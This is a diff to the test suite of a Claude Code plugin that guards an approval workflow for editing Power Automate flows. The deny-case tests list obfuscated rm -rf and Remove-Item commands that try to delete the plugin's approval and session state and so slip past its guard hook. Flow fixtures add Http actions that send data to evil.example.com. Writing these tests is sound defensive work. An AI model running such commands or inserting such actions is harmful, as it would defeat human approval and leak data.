@@ -178,7 +178,7 @@ print("5. Wykonanie (HTTP podmieniony)")
 sys.path.insert(0, str(SCRIPTS))
 import ppcall as P  # noqa: E402
 calls = []
-P.http = lambda m, u, b=None, timeout=90: (calls.append((m, u)) or (200, b'{"ok":true}'))
+P.http = lambda m, u, b=None, timeout=90, headers=None: (calls.append((m, u)) or (200, b'{"ok":true}'))
 os.chdir(WORK)
 try:
     P.cmd_exec(["INC-1", "1"])
@@ -1140,6 +1140,42 @@ expect("stan: PowerShell sklejanie", guard_in("sesja-5", "PowerShell", {"command
 expect("uspiony: zwykle polecenie z .claude", guard_in("sesja-5", "Bash", {"command": "ls .claude/skills/*"}), None)
 expect("uspiony: aktualizacja pluginu", guard_in("sesja-5", "Bash",
        {"command": "claude plugin update pp-support@ekovoltis-it --scope user"}), None)
+# 1.1.1: praca nad kodem pluginu i zwykle polecenia nie sa traktowane jak obejscie ochrony stanu
+for label, tool, cmd in [
+        ("cd do pluginu w cudzyslowie", "Bash", f'cd "{ROOT}" && python tests/test_harness.py'),
+        ("cd do pluginu w apostrofach", "Bash", f"cd '{ROOT.as_posix()}' && git status"),
+        ("cd do pluginu w PowerShell", "PowerShell", f'Set-Location "{ROOT}"; git status'),
+        ("grep po slowie akceptacje", "Bash", "grep -rn akceptacje scripts/ tests/"),
+        ("commit z nazwa pluginu", "Bash", 'git commit -m "pp-support 1.1.1: poprawka straznika"'),
+        ("notatka heredoc", "Bash", "cat > notatka.md <<'EOF'\nakceptacje i sesje w pp-support, ~30 min\nEOF"),
+        ("katalog sesje w projekcie", "Bash", "ls docs/sesje/"),
+        ("glob w projekcie", "Bash", "ls plugins/pp-*/scripts/*.py"),
+        ("commit z .claude i akceptacjami", "Bash",
+         'git commit -m "pp-support: akceptacje, sesje i .claude/settings.local.json"')]:
+    expect(f"1.1.1 przechodzi: {label}", guard_in("sesja-5", tool, {"command": cmd}), None)
+for label, tool, cmd, cwd in [
+        ("cd ~/.claude i pp-s*", "Bash", "cd ~/.claude && rm -r pp-s*/akceptacje", OTHER),
+        ("$HOME i pp-supp*", "Bash", "rm -rf $HOME/.claude/pp-supp*", OTHER),
+        ("~ i .cl*", "Bash", "cd ~ && rm -r .cl*/pp-*/sesje", OTHER),
+        ("sklejone .claude i glob", "Bash", "cd && rm -r .cl''aude/pp-sup*", OTHER),
+        ("USERPROFILE w PowerShell", "PowerShell", 'Remove-Item "$env:USERPROFILE\\.claude\\pp-s*" -Recurse', OTHER),
+        ("sklejanie w cudzyslowach", "Bash", 'rm -r "pp-support-"\'state\'/sesje', OTHER),
+        ("glob pod .claude", "Bash", "rm -rf ~/.claude/p*", OTHER),
+        ("sciezka przez ..", "Bash", "rm -r ../../../.c*/pp-s*", OTHER),
+        (".c* bez .cl", "Bash", "cd /c/Users/x && rm -r .c*/pp-supp*/sesje", OTHER),
+        (".[c]laude", "Bash", "rm -r .[c]laude/pp-*/akceptacje/", OTHER),
+        ("glob za domem", "PowerShell", f"Remove-Item {Path.home()}\\*\\pp-supp* -Recurse", OTHER),
+        ("glob za domem (Git Bash)", "Bash",
+         "rm -rf /" + Path.home().as_posix().replace(":", "", 1).lower() + "/.c?aude/pp-supp*", OTHER),
+        ("zmienna rozbija kotwice", "Bash", "rm -r /c/Users/x/.cl${e}aude/pp-supp*", OTHER),
+        ("glob *-state bez kotwicy", "Bash", "rm -r $D/*-state", OTHER),
+        ("interpreter z fragmentem nazwy", "Bash",
+         "python -c \"import shutil; shutil.rmtree('%s-state' % 'pp-support')\"", OTHER),
+        ("sasiednie literaly", "Bash",
+         "python -c \"import shutil,os; shutil.rmtree(os.path.join('/x', 'pp-support-' 'state'))\"", OTHER),
+        ("akceptacje z cwd w .claude", "Bash", "rm -r */akceptacje", Path.home() / ".claude"),
+        ("cwd w katalogu stanu", "Bash", "rm -f *.json", TMP / "state/akceptacje")]:
+    expect(f"1.1.1 nadal deny: {label}", guard_in("sesja-5", tool, {"command": cmd}, cwd), "deny")
 guard_in("sesja-7", "Bash", {"command": "bash scripts/ppcall&&ls"})
 expect("ppcall&& aktywuje", C.session_active("sesja-7", OTHER), True)
 cfg_file = TMP / "state/config.json"
@@ -1163,6 +1199,495 @@ matcher = _re.compile("^(" + hooks_cfg["hooks"]["PreToolUse"][0]["matcher"] + ")
 for tool in ["Bash", "PowerShell", "Write", "Edit", "MultiEdit", "NotebookEdit", "Read", "Skill",
              "mcp__claude-in-chrome__computer", "mcp__Claude_Browser__navigate", "mcp__dataverse__update_record"]:
     expect(f"hooks.json: {tool}", bool(matcher.match(tool)), True)
+
+print("26. 1.2.0: szerszy flow-patch (Select, Query, warunki, runAfter)")
+P = importlib.reload(P)
+WF3 = "5b2f7a10-1c3d-4e5f-8a9b-0c1d2e3f4a5b"
+A3 = ["properties", "definition", "actions"]
+DEF3 = {"properties": {
+    "connectionReferences": {"shared_teams": {"connection": {"connectionReferenceLogicalName": "eko_teams"}}},
+    "definition": {"triggers": {"Recurrence": {"type": "Recurrence", "recurrence": {"frequency": "Day"}}},
+                   "actions": {
+        "Scope_|_Prepare": {"type": "Scope", "runAfter": {}, "actions": {
+            "Select_Missing_PointActivityPeriods": {"type": "Select", "runAfter": {},
+                                                    "inputs": {"from": "@body('X')", "select": {"Jednostka": "@item()?['name']"}}},
+            "Filter_array": {"type": "Query", "runAfter": {"Select_Missing_PointActivityPeriods": ["Succeeded"]},
+                             "inputs": {"from": "@body('Select_Missing_PointActivityPeriods')", "where": "@true"}}}},
+        "Initialize_Day_Ahead": {"type": "InitializeVariable", "runAfter": {"Scope_|_Prepare": ["Succeeded"]},
+                                 "inputs": {"variables": [{"name": "Day Ahead", "type": "string", "value": "@{utcNow()}"}]}},
+        "Condition": {"type": "If", "runAfter": {"Initialize_Day_Ahead": ["Succeeded"]},
+                      "expression": {"and": [{"greater": ["@length(body('Filter_array'))", 0]}]},
+                      "actions": {"Post_message": {"type": "OpenApiConnection", "runAfter": {},
+                                                   "inputs": {"host": {"connectionName": "shared_teams",
+                                                                       "operationId": "PostMessageToConversation"},
+                                                              "parameters": {"body/messageBody": "<p>Brak okresow</p>"}}}},
+                      "else": {"actions": {}}},
+        "Send_HTTP": {"type": "Http", "runAfter": {"Condition": ["Succeeded"]},
+                      "inputs": {"method": "POST", "uri": "https://example.org/hook", "body": "@{1}"}}}}}}
+
+
+class FakeFlow(FakeDataverse):
+    """Dataverse z jednym flow WF3; opcjonalnie zapis zmienia stan albo dodaje roznice."""
+
+    def reset(self, managed=False, definition=None):
+        super().reset(managed)
+        self.clientdata = json.dumps(definition or DEF3, ensure_ascii=False)
+        self.state_after_write = None
+
+    def record(self):
+        r = super().record()
+        if self.state_after_write is not None and self.patches:
+            r["statecode"] = self.state_after_write
+        return r
+
+    def __call__(self, method, url, body=None, timeout=90, headers=None):
+        if method == "PATCH" and self.extra_change and body:
+            data = json.loads(body["clientdata"])
+            data["properties"]["definition"]["triggers"]["Recurrence"]["recurrence"]["frequency"] = "Hour"
+            body, self.extra_change = {"clientdata": json.dumps(data)}, False
+        return super().__call__(method, url.replace(WF3, WF), body, timeout, headers)
+
+
+FD = FakeFlow()
+P.http = FD
+cfg = C.load_config()
+cfg["flow_patch_dataverse_urls"] = [DV]
+cfg["flow_definition_dataverse_urls"] = []
+C.save_config(cfg)
+SEL = A3 + ["Scope_|_Prepare", "actions", "Select_Missing_PointActivityPeriods", "inputs", "select"]
+WHERE = A3 + ["Scope_|_Prepare", "actions", "Filter_array", "inputs", "where"]
+COND = A3 + ["Condition", "expression"]
+RA = A3 + ["Initialize_Day_Ahead", "runAfter"]
+for label, path in [("Select inputs/select", SEL), ("Query inputs/where", WHERE), ("If expression", COND),
+                    ("runAfter", RA), ("Terminate runStatus", A3 + ["T", "inputs", "runStatus"]),
+                    ("Foreach foreach", A3 + ["F", "foreach"]), ("Table columns", A3 + ["T", "inputs", "columns"])]:
+    expect(f"1.2.0 flow-patch: {label} dozwolone", C.flow_patch_path_problem(path), None)
+for label, path in [("glebiej w select", SEL + ["Jednostka"]), ("runAfter/x", RA + ["x"]),
+                    ("expression w inputs", A3 + ["Condition", "inputs", "expression"]),
+                    ("type", A3 + ["Condition", "type"]), ("uri", A3 + ["Send_HTTP", "inputs", "uri"])]:
+    expect(f"1.2.0 flow-patch: {label} odrzucone", C.flow_patch_path_problem(path) is not None, True)
+
+SEL_OLD = {"Jednostka": "@item()?['name']"}
+SEL_NEW = {"Jednostka": "@item()?['name']", "PPE": "@item()?['ppe']",
+           "Link": "@concat('https://ekovoltis.crm4.dynamics.com/main.aspx?id=', item()?['id'])"}
+
+
+def fp3(changes, extra_sections=True):
+    step = {"nr": 1, "opis": "Komunikat z linkiem do jednostki", "typ": "flow-patch", "srodowisko": DV,
+            "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z", "zmiany": changes}
+    return fp_plan([]).replace("FP-1", "FP3-1").split("## Kroki")[0] + "## Kroki\n```json\n" + \
+        json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n"
+
+
+def live3(changes, definition=DEF3):
+    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
+    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]
+
+
+expect("1.2.0: Select z JSON, inna kolejnosc kluczy w 'bylo'",
+       live3([{"sciezka": SEL, "bylo": json.loads(json.dumps(SEL_OLD)), "ma_byc": SEL_NEW}]), [])
+expect("1.2.0: inputs/select w akcji innej niz Select odrzucone",
+       any("tylko w akcji Select" in e for e in live3(
+           [{"sciezka": A3 + ["Udaje_Select", "inputs", "select"], "bylo": "x", "ma_byc": "y"}],
+           {"properties": {"definition": {"actions": {"Udaje_Select": {"type": "Compose", "inputs": {"select": "x"}}}}}})), True)
+expect("1.2.0: expression w akcji innej niz If/Until",
+       bool(live3([{"sciezka": A3 + ["Send_HTTP", "expression"], "bylo": "x", "ma_byc": "y"}])), True)
+expect("1.2.0: runAfter na akcje z innego zakresu",
+       any("spoza tego zakresu" in e for e in live3([{"sciezka": RA, "bylo": {"Scope_|_Prepare": ["Succeeded"]},
+                                                      "ma_byc": {"Filter_array": ["Succeeded"]}}])), True)
+expect("1.2.0: runAfter z cyklem",
+       any("cykl" in e for e in live3([{"sciezka": A3 + ["Scope_|_Prepare", "runAfter"], "bylo": {},
+                                        "ma_byc": {"Condition": ["Succeeded"]}}])), True)
+expect("1.2.0: runAfter przestawiony poprawnie",
+       live3([{"sciezka": RA, "bylo": {"Scope_|_Prepare": ["Succeeded"]}, "ma_byc": {}},
+              {"sciezka": A3 + ["Scope_|_Prepare", "runAfter"], "bylo": {}, "ma_byc": {"Initialize_Day_Ahead": ["Succeeded"]}}]), [])
+expect("1.2.0: runAfter ze zlym statusem (statycznie)",
+       any("statusy" in e for e in C.flow_patch_problems(json.loads(fp3([{"sciezka": RA, "bylo": {}, "ma_byc": {"Condition": ["Done"]}}]).split("```json\n")[1].split("\n```")[0])[0], 1)), True)
+expect("1.2.0: parameters nadal tylko tekst",
+       any("tekstem" in e for e in C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
+                                                          "zmiany": [{"sciezka": A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"],
+                                                                      "bylo": "<p>Brak okresow</p>", "ma_byc": {"x": 1}}]}, 1)), True)
+expect("1.2.0: zmiana zawierajaca inna zmiane",
+       any("zawiera" in e for e in C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
+                                                          "zmiany": [{"sciezka": A3 + ["Initialize_Day_Ahead", "inputs"], "bylo": 1, "ma_byc": 2},
+                                                                     {"sciezka": A3 + ["Initialize_Day_Ahead", "inputs", "variables", "0", "value"], "bylo": "a", "ma_byc": "b"}]}, 1)), True)
+
+text = fp3([{"sciezka": SEL, "bylo": SEL_OLD, "ma_byc": SEL_NEW},
+            {"sciezka": A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"],
+             "bylo": "<p>Brak okresow</p>", "ma_byc": "<p>Jednostki bez okresu aktywnosci na dzien @{variables('Day Ahead')}</p>"}])
+code, txt = plan_check(text, "FP3-1")
+expect("1.2.0 flow-patch Select: plan-check", (code, txt.count("ma byc:")), (None, 2))
+accept("FP3-1", text)
+ask = hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": f"{Q} exec FP3-1 1"}, "cwd": str(WORK)})
+expect("1.2.0 flow-patch Select: pytanie z wartoscia JSON",
+       "PPE" in ((ask or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", "")), True)
+expect("1.2.0 flow-patch Select: exec", run_exec("FP3-1"), None)
+written = json.loads(FD.clientdata)
+expect("1.2.0 flow-patch Select: nowe mapowanie", C.get_at(written, SEL), SEL_NEW)
+expect("1.2.0 flow-patch Select: reszta bez zmian",
+       [d for d in C.leaf_diff(DEF3, written) if d[:len(SEL)] != tuple(SEL)],
+       [tuple(A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"])])
+
+print("27. 1.2.0: krok flow-definition (pelna definicja z pliku)")
+FD.reset()
+
+
+def fd_plan(incident, plik, sha, modifiedon="2026-08-25T09:52:49Z", env=DV):
+    step = {"nr": 1, "opis": "Data dnia w komunikacie: nowa akcja Compose", "typ": "flow-definition",
+            "srodowisko": env, "workflowid": WF3, "oczekiwany_modifiedon": modifiedon, "plik": plik, "sha256": sha}
+    return fp_plan([]).replace("FP-1", incident).split("## Kroki")[0] + "## Kroki\n```json\n" + \
+        json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n"
+
+
+def write_def(incident, definition, name=None) -> tuple[str, str]:
+    d = WORK / "zgloszenia" / incident
+    d.mkdir(parents=True, exist_ok=True)
+    name = name or f"flow-{WF3}-nowa.json"
+    path = d / name
+    path.write_text(json.dumps(definition, ensure_ascii=False, indent=1), encoding="utf-8")
+    return name, C.file_sha256(path)
+
+
+NEWDEF = copy.deepcopy(DEF3)
+acts = NEWDEF["properties"]["definition"]["actions"]
+acts["Compose_Dzien"] = {"type": "Compose", "runAfter": {"Scope_|_Prepare": ["Succeeded"]},
+                         "inputs": "@formatDateTime(addDays(utcNow(), 1), 'yyyy-MM-dd')"}
+acts["Initialize_Day_Ahead"]["runAfter"] = {"Compose_Dzien": ["Succeeded"]}
+del acts["Scope_|_Prepare"]["actions"]["Filter_array"]
+acts["Condition"]["expression"] = {"and": [{"greater": ["@length(body('Select_Missing_PointActivityPeriods'))", 0]}]}
+
+name, sha = write_def("FD-1", NEWDEF)
+code, txt = plan_check(fd_plan("FD-1", name, sha), "FD-1")
+expect("flow-definition: wylaczony bez ustawienia", (code, "nie jest wlaczony" in txt), (2, True))
+cfg["flow_definition_dataverse_urls"] = [DV]
+C.save_config(cfg)
+code, txt = plan_check(fd_plan("FD-1", name, sha), "FD-1")
+expect("flow-definition: plan-check przechodzi", code, None)
+expect("flow-definition: diff pokazuje dodana akcje", "dodana: Compose_Dzien (Compose)" in txt, True)
+expect("flow-definition: diff pokazuje usunieta akcje", "usunieta: Filter_array (Query)" in txt, True)
+expect("flow-definition: diff pokazuje zmieniona akcje", "zmieniona: Condition (If)" in txt, True)
+expect("flow-definition: krok wycofania wypisany", '"plik": "backup/' in txt, True)
+expect("flow-definition: plan-check niczego nie zapisuje", FD.patches, [])
+expect("flow-definition: zly skrot", plan_check(fd_plan("FD-1", name, "0" * 64), "FD-1")[0], 2)
+expect("flow-definition: plik spoza katalogu", plan_check(fd_plan("FD-1", "../x.json", sha), "FD-1")[0], 2)
+expect("flow-definition: inna nazwa pliku", plan_check(fd_plan("FD-1", "nowa.json", sha), "FD-1")[0], 2)
+expect("flow-definition: srodowisko spoza listy",
+       plan_check(fd_plan("FD-1", name, sha, env="https://ekovoltis.crm4.dynamics.com"), "FD-1")[0], 2)
+expect("flow-definition: bez sekcji Analiza wpływu",
+       plan_check(fd_plan("FD-1", name, sha).replace("## Analiza wpływu", "## Inne"), "FD-1")[0], 2)
+
+
+def bad_def(change):
+    d = copy.deepcopy(NEWDEF)
+    change(d)
+    return d
+
+
+def wf_live(definition, new, restoring=False):
+    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
+    return C.flow_definition_live_problems({"oczekiwany_modifiedon": "m"}, wf, new, restoring)[0]
+
+
+expect("flow-definition na zywo: poprawna", wf_live(DEF3, NEWDEF), [])
+for label, change, needle in [
+    ("zmiana wyzwalacza", lambda d: d["properties"]["definition"]["triggers"]["Recurrence"]["recurrence"].update(frequency="Hour"), "poza akcjami"),
+    ("zmiana connectionReferences", lambda d: d["properties"]["connectionReferences"]["shared_teams"]["connection"].update(connectionReferenceLogicalName="inne"), "poza akcjami"),
+    ("dodany $connections", lambda d: d["properties"].setdefault("definition", {}).setdefault("parameters", {}).update({"$connections": {}}), "poza akcjami"),
+    ("dodana akcja Http", lambda d: d["properties"]["definition"]["actions"].update(
+        Wyslij={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://evil.example.com", "body": "@{body('X')}"}}), "Wyslij"),
+    ("dodana akcja konektora", lambda d: d["properties"]["definition"]["actions"].update(
+        Mail={"type": "OpenApiConnection", "runAfter": {}, "inputs": {"host": {"connectionName": "shared_teams"}, "parameters": {}}}), "Mail"),
+    ("zmiana host w istniejacej akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["actions"]["Post_message"]["inputs"]["host"].update(connectionName="shared_office365"), "Post_message"),
+    ("zmiana uri w Http", lambda d: d["properties"]["definition"]["actions"]["Send_HTTP"]["inputs"].update(uri="https://evil.example.com"), "Send_HTTP"),
+    ("zmiana body akcji Http", lambda d: d["properties"]["definition"]["actions"]["Send_HTTP"]["inputs"].update(body="@{body('Tajne')}"), "Send_HTTP"),
+    ("zmiana typu akcji", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(type="Http"), "Compose_Dzien"),
+    ("runAfter na nieistniejaca akcje", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(runAfter={"Brak": ["Succeeded"]}), "Brak"),
+    ("cykl runAfter", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(runAfter={"Initialize_Day_Ahead": ["Succeeded"]}), "cykl"),
+    ("klucz uri w nowej Compose", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(inputs={"uri": "https://x"}), "Compose_Dzien"),
+    ("powtorzona nazwa akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["else"]["actions"].update(
+        Compose_Dzien={"type": "Compose", "runAfter": {}, "inputs": "x"}), "wiecej niz raz"),
+    ("ponad 10 akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["else"]["actions"].update(
+        {f"C{i}": {"type": "Compose", "runAfter": {}, "inputs": i} for i in range(10)}), "najwyzej 10"),
+]:
+    errs = wf_live(DEF3, bad_def(change))
+    expect(f"flow-definition odrzuca: {label}", any(needle in e for e in errs), True)
+expect("flow-definition: bez zmian akcji", any("nie zmienia" in e for e in wf_live(DEF3, copy.deepcopy(DEF3))), True)
+FD.reset(managed=True)
+expect("flow-definition: flow zarzadzany", plan_check(fd_plan("FD-1", name, sha), "FD-1")[0], 2)
+FD.reset()
+
+text = fd_plan("FD-1", name, sha)
+plan_check(text, "FD-1")
+accept("FD-1", text)
+ask = hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": f"{Q} exec FD-1 1"}, "cwd": str(WORK)})
+expect("flow-definition: exec -> pytanie", (ask or {}).get("hookSpecificOutput", {}).get("permissionDecision"), "ask")
+expect("flow-definition: pytanie mowi o kopii i pliku",
+       "przywroci kopie" in (ask or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", ""), True)
+(WORK / "zgloszenia/FD-1" / name).write_text(json.dumps(bad_def(lambda d: d["properties"]["definition"]["actions"].update(
+    Wyslij={"type": "Compose", "runAfter": {}, "inputs": "x"})), ensure_ascii=False), encoding="utf-8")
+expect("flow-definition: plik zmieniony po akceptacji -> hook odmawia", decision(f"{Q} exec FD-1 1"), "deny")
+expect("flow-definition: plik zmieniony po akceptacji -> ppcall odmawia", run_exec("FD-1"), 3)
+expect("flow-definition: nic nie zapisano", FD.patches, [])
+write_def("FD-1", NEWDEF)
+expect("flow-definition: exec", run_exec("FD-1"), None)
+expect("flow-definition: If-Match", FD.patches[0]["if_match"] if FD.patches else None, 'W/"100"')
+expect("flow-definition: zapisana definicja = plik", C.leaf_diff(NEWDEF, json.loads(FD.clientdata)), [])
+backups = sorted((WORK / "zgloszenia/FD-1/backup").glob(f"{WF3}-*.json"))
+expect("flow-definition: kopia", len(backups), 1)
+entry = json.loads((WORK / "zgloszenia/FD-1/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
+expect("flow-definition: dziennik", (entry["sukces"], bool(entry.get("kopia_sha256")), len(entry.get("zmiany_akcji", []))),
+       (True, True, 4))
+expect("flow-definition: kopia w rejestrze kopii", C.is_registered_backup(WF3, entry["kopia_sha256"]), True)
+
+print("   wycofanie z kopii (przywraca usunieta akcje bez ograniczen kluczy)")
+REM = copy.deepcopy(DEF3)
+del REM["properties"]["definition"]["actions"]["Send_HTTP"]
+FD.reset()
+name, sha = write_def("FD-2", REM)
+text = fd_plan("FD-2", name, sha)
+expect("usuniecie akcji Http: plan-check", plan_check(text, "FD-2")[0], None)
+accept("FD-2", text)
+expect("usuniecie akcji Http: exec", run_exec("FD-2"), None)
+entry = json.loads((WORK / "zgloszenia/FD-2/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
+kopia = Path(entry["kopia"])
+rel = f"backup/{kopia.name}"
+text = fd_plan("FD-3", rel, entry["kopia_sha256"], modifiedon=entry["modifiedon_po"])
+(WORK / "zgloszenia/FD-3/backup").mkdir(parents=True, exist_ok=True)
+shutil.copy(kopia, WORK / "zgloszenia/FD-3" / rel)
+code, txt = plan_check(text, "FD-3")
+expect("wycofanie z kopii: plan-check", (code, "dodana: Send_HTTP (Http)" in txt), (None, True))
+accept("FD-3", text)
+expect("wycofanie z kopii: exec", run_exec("FD-3"), None)
+expect("wycofanie z kopii: definicja jak przed zmiana", C.leaf_diff(DEF3, json.loads(FD.clientdata)), [])
+fake = WORK / "zgloszenia/FD-4/backup" / f"{WF3}-20261104T100000Z.json"
+fake.parent.mkdir(parents=True, exist_ok=True)
+fake.write_text(json.dumps(bad_def(lambda d: d["properties"]["definition"]["actions"].update(
+    Wyslij={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://evil.example.com"}})),
+    ensure_ascii=False), encoding="utf-8")
+code, txt = plan_check(fd_plan("FD-4", f"backup/{fake.name}", C.file_sha256(fake), modifiedon=FD.modifiedon), "FD-4")
+expect("podrobiona kopia spoza rejestru: Http odrzucone", (code, "Wyslij" in txt), (2, True))
+
+print("   zapis niezgodny z plikiem albo zmiana stanu -> przywrocenie kopii")
+for incident, setup, needle in [("FD-5", lambda: setattr(FD, "extra_change", True), "nieoczekiwane_roznice"),
+                                ("FD-6", lambda: setattr(FD, "state_after_write", 0), "stan_flow")]:
+    FD.reset()
+    name, sha = write_def(incident, NEWDEF)
+    text = fd_plan(incident, name, sha)
+    plan_check(text, incident)
+    accept(incident, text)
+    setup()
+    expect(f"{incident}: krok nieudany", run_exec(incident), 4)
+    expect(f"{incident}: definicja przywrocona", C.leaf_diff(DEF3, json.loads(FD.clientdata)), [])
+    entry = json.loads((WORK / f"zgloszenia/{incident}/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
+    expect(f"{incident}: w dzienniku", (bool(entry.get(needle)), entry.get("przywrocono")), (True, True))
+
+print("28. 1.2.0: odczyt Dataverse z nazwami, runs po workflowid, rejestr, konfiguracja, bez SWO")
+expect("Prefer dla Dataverse", "FormattedValue" in json.dumps(P.read_headers(f"{DV}/api/data/v9.2/accounts")), True)
+expect("bez Prefer dla Flow API", P.read_headers("https://api.flow.microsoft.com/x"), {})
+cfg["dataverse_urls"] = [DV]
+C.save_config(cfg)
+FLOWID = "9c1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8"
+
+
+def env_api(m, u, b=None, timeout=90, headers=None):
+    if u.startswith("https://api.bap.microsoft.com/"):
+        return 200, json.dumps({"value": [
+            {"name": "Default-0000", "properties": {"linkedEnvironmentMetadata": {"instanceUrl": "https://inne.crm4.dynamics.com/"}}},
+            {"name": ENV, "properties": {"linkedEnvironmentMetadata": {"instanceUrl": DV + "/"}}}]}).encode()
+    if u.startswith(f"{DV}/api/data/v9.2/workflows({WF3})"):
+        return 200, json.dumps({"name": "007_Send Notifications to Producers", "resourceid": FLOWID,
+                                "workflowidunique": WF}).encode()
+    if u == f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOWID}?api-version=2016-11-01":
+        return 200, b"{}"
+    return 404, b"{}"
+
+
+P.http = env_api
+expect("runs: srodowisko i flow z adresu Dataverse", P.resolve_flow(DV, WF3), (ENV, FLOWID))
+try:
+    P.resolve_flow("https://obce.crm4.dynamics.com", WF3)
+    expect("runs: Dataverse spoza listy", "brak bledu", "RuntimeError")
+except RuntimeError:
+    expect("runs: Dataverse spoza listy", "RuntimeError", "RuntimeError")
+buf = io.StringIO()
+with contextlib.redirect_stdout(buf):
+    P.cmd_rejestr(["akdw"])
+first = [l for l in buf.getvalue().splitlines() if l.startswith("prefix")][:1]
+expect("rejestr: dokladne trafienie akronimu pierwsze", first, ["prefix      : 007"])
+buf = io.StringIO()
+with contextlib.redirect_stdout(buf):
+    P.cmd_rejestr(["--flow", DV, WF3])
+expect("rejestr --flow: numer z nazwy flow", "akronim     : AKDW" in buf.getvalue() and "AKDWT" not in buf.getvalue(), True)
+expect("straznik: ppcall konfiguracja", decision(f"{Q} konfiguracja"), "allow")
+r = subprocess.run([BASH, PPCALL, "konfiguracja"], cwd=WORK, capture_output=True, text=True, encoding="utf-8",
+                   errors="replace", env=os.environ, timeout=120)
+expect("ppcall konfiguracja: wypisuje ustawienia", "flow_definition_dataverse_urls" in r.stdout, True)
+swo = [str(p.relative_to(ROOT)) for p in list((ROOT / "scripts").glob("*.py")) + list((ROOT / "skills").rglob("*.md"))
+       + [ROOT / "README.md"] if "SWO" in p.read_text(encoding="utf-8")]
+expect("bez odwolan do SWO w kodzie, skillach i README", swo, [])
+print("29. 1.2.0 po przegladzie: zaleznosci akcji wysylajacych, typy, zakresy, kroki http i cli, kopie w powloce")
+DEF4 = {"properties": {"definition": {"triggers": {}, "actions": {
+    "Init_base": {"type": "InitializeVariable", "runAfter": {},
+                  "inputs": {"variables": [{"name": "base", "type": "string", "value": "https://api.partner.pl"}]}},
+    "Compose_naglowek": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Basic abc"},
+    "Compose_tekst": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Dzien dobry"},
+    "I": {"type": "If", "runAfter": {"Compose_naglowek": ["Succeeded"]}, "expression": {"equals": [1, 1]},
+          "actions": {}, "else": {"actions": {
+              "H2": {"type": "Http", "runAfter": {}, "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}},
+    "H": {"type": "Http", "runAfter": {"I": ["Succeeded"]},
+          "inputs": {"method": "POST", "uri": "@{variables('base')}/x",
+                     "headers": {"Authorization": "@{outputs('Compose_naglowek')}"},
+                     "authentication": {"type": "Basic", "username": "u", "password": "p"}, "body": "@{1}"}}}}}}
+A4 = ["properties", "definition", "actions"]
+expect("zaleznosci: zmienna i Compose uzyte w adresie i naglowkach", C.sensitive_refs(DEF4),
+       {("var", "base"), ("act", "compose_naglowek")})
+
+
+def chain(actions):
+    return {"properties": {"definition": {"triggers": {}, "actions": actions}}}
+
+
+HTTP_ = lambda uri, ra=None: {"type": "Http", "runAfter": ra or {}, "inputs": {"method": "POST", "uri": uri}}  # noqa: E731
+for label, actions, target in [
+    ("Compose -> Select -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
+                                    "Sel": {"type": "Select", "inputs": {"from": "@outputs('Cmp')", "select": "@item()"}},
+                                    "H": HTTP_("@{body('Sel')}")}, "cmp"),
+    ("Compose -> zmienna -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
+                                     "Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "u", "value": "@{outputs('Cmp')}"}]}},
+                                     "H": HTTP_("@{variables('u')}")}, "cmp"),
+    ("Foreach nad Compose, item()", {"Cmp": {"type": "Compose", "inputs": ["https://a"]},
+                                      "FE": {"type": "Foreach", "foreach": "@outputs('Cmp')", "actions": {"H": HTTP_("@{item()}")}}}, "cmp"),
+    ("wielkosc liter w nazwie zmiennej", {"Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "base", "value": "https://a"}]}},
+                                           "H": HTTP_("@{variables('BASE')}")}, "init"),
+    ("nazwa wyliczana", {"Cmp": {"type": "Compose", "inputs": "x"}, "H": HTTP_("@{variables(concat('ba','se'))}")}, "cmp"),
+]:
+    d = chain(actions)
+    names = {n for n, (_, a) in C.flatten_actions(d["properties"]["definition"]["actions"])[0].items() if n.lower() == target}
+    hit = C.sensitive_hit(C.defines(next(iter(names)), C.flatten_actions(d["properties"]["definition"]["actions"])[0][next(iter(names))][1]),
+                          C.sensitive_refs(d))
+    expect(f"zaleznosci domkniete: {label}", bool(hit), True)
+expect("defines: klucze Inputs/Name wielka litera",
+       C.defines("S", {"type": "SetVariable", "Inputs": {"Name": "Base", "value": "x"}}), {("act", "s"), ("var", "base")})
+expect("result() jako odczyt hasel", bool(C.SECRET_REF_RE.search("@result('Scope')")), True)
+
+
+def live4(changes, definition=DEF4):
